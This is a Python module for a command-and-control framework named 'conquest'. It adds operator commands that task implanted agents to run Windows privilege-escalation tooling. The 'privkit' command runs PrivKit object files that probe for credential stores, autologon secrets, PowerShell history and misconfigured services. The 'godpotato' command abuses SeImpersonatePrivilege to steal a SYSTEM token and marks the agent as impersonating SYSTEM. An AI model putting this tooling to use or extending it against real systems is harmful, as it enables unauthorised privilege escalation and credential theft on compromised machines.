import conquest
import os.path

SCRIPT_DIR = os.path.dirname(__file__)

# Windows Privilege Escalation checks using PrivKit BOFs by @merterpreter & @nickvourd
PRIVESC_CHECKS = {
    "always-install-elevated": "PrivKit/AlwaysInstallElevatedCheck/AlwaysInstallElevatedCheck.x64.o",
    "autologon": "PrivKit/AutoLogonCheck/AutoLogonCheck.x64.o",
    "cred-manager": "PrivKit/CredentialManagerCheck/CredentialManagerCheck.x64.o",
    "hijack-path": "PrivKit/HijackablePathCheck/HijackablePathCheck.x64.o",
    "modify-autorun": "PrivKit/ModifiableAutorunCheck/ModifiableAutorunCheck.x64.o",
    "modify-svc": "PrivKit/ModifiableSVCCheck/ModifiableSVCCheck.x64.o",
    "token-privs": "PrivKit/TokenPrivilegesCheck/TokenPrivilegesCheck.x64.o",
    "unquoted-svc-path": "PrivKit/UnquotedSVCPathCheck/UnquotedSVCPathCheck.x64.o",
    "ps-history": "PrivKit/PowerShellHistoryCheck/PowerShellHistoryCheck.x64.o",
    "uac-status": "PrivKit/UACStatusCheck/UACStatusCheck.x64.o"
}
def _privkit(agentId, cmdline, args): 
    check = conquest.get_string(args, 0).lower()
        
    if check == "all":
        # Execute all checks
        for name, path in PRIVESC_CHECKS.items():
            bof = os.path.join(SCRIPT_DIR, path)
            if os.path.exists(bof):
                conquest.execute_alias(agentId, f"privkit {name}", f"bof {bof}")
            else:
                conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
    else:
        # Execute specific check
        path = PRIVESC_CHECKS.get(check)
        if path is None:
            conquest.error(agentId, f"Invalid privilege escalation check: {check}", cmdline)
            return
        
        bof = os.path.join(SCRIPT_DIR, path)
        if os.path.exists(bof):
            conquest.execute_alias(agentId, cmdline, f"bof {bof}")
        else:
            conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

cmd_privkit = (
    conquest.createCommand(name="privkit", description="Run Windows privilege escalation checks.", example="privkit unquoted-svc-path",
                           message="Tasked agent to run privilege escalation check.", mitre=["TA0004"])
            .addArgString("check", """Privilege escalation check to run.
Available options:
  - all
  - always-install-elevated
  - autologon
  - cred-manager
  - hijack-path
  - modify-autorun
  - modify-svc
  - token-privs
  - unquoted-svc-path
  - ps-history
  - uac-status""", True)
            .setHandler(_privkit)
).registerToGroup("privilege escalation")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def _godpotato(agentId, cmdline, args):
    cmd = conquest.get_string(args, 0)
    pipe = conquest.get_string(args, 1)

    bof = os.path.join(SCRIPT_DIR, "GodPotato/dist/BOF.x64.o")
    params = conquest.bof_pack("zz", [
        cmd if cmd else "token",        # z: Action
        pipe                            # z: Pipe name 
    ])

    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
    else:
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

def _godpotatoOutput(agentId, output): 
    if "[*] Got SYSTEM token" in output and "[*] Running" not in output: 
        conquest.set_impersonation(agentId, "NT AUTHORITY\\SYSTEM")
    conquest.output(agentId, output)

cmd_godpotato = (
    conquest.createCommand(name="godpotato", description="Escalate privileges to NT AUTHORITY\\SYSTEM via SeImpersonatePrivilege (GodPotato).", example="godpotato cmd /c whoami --pipe my-custom-pipe",
                           message="Tasked agent to elevate privileges via SeImpersonatePrivilege (GodPotato).", mitre=["T1134.001"])
            .addArgString("command", "Command to execute. If not set, this command steals the SYSTEM token and impersonates it instead.", False, "", -1)
            .addFlagString("--pipe", "pipe", "Pipe to write output to.")
            .setHandler(_godpotato)
            .setOutputHandler(_godpotatoOutput)
).registerToGroup("privilege escalation")